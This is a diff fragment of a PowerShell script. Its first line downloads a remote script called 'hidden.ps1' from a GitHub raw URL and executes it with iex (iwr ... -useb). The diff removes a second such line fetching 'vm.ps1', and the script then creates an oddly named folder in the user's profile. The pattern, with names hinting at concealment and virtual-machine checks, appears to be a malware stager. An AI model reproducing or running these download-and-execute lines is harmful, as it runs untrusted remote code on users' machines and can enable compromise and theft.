@@ -1,5 +1,5 @@
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
-iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.ps1" -useb)
+
 $dir = "$env:userprofile\150F4013"
 New-Item -ItemType Directory -Path $dir
 
